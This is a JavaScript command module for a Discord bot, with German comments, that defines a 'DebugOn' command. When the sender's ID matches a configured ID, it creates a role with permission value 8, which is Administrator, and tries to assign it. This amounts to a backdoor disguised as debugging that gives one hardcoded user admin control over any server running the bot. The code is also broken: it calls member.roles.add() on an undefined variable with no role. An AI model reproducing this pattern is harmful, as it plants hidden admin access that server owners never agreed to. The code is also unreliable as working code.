const german = require('../languages/german.json')
const server = require('../config/config.json')
const command = require('../commands/command')
const extra = require('../languages/extra.json')
const english = require('../languages/english.json')

module.exports = (bot) => {
    command(bot, 'DebugOn', message => {
        if (message.author.bot) return;
            //Überprüfung ob diese DiscordID in der .env steht
            if (message.author.id === (server.DEBUGID)){
                //Überprüft ob Debug Rang bereits existiert
                if (message.guild.roles.cache.find(role => role.name == (server.DEBUGROLE))){
                    message.channel.send("jo")
                }else{
                    //Erstellt Debug Rang, falls dieser nicht existiert.
                    message.channel.send("Debug Rang wird erstellt und zugewiesen.")
                    //Erstellt Debug Rang
                    message.guild.roles.create({
                        data: {
                            name: (server.DEBUGROLE),
                            permissions: 8
                        }
                    })
                }
                //2 Sekunden warten, bevor er weiter macht.
                setTimeout(function(){ 
                    member.roles.add()
                    message.channel.send("Der Rang wurde zugewiesen.")
                    
               }, 2000);
            } else {
                //Falls DiscordID nicht in der .env steht
                message.channel.send(german.not_allowed)
            }
    });
}
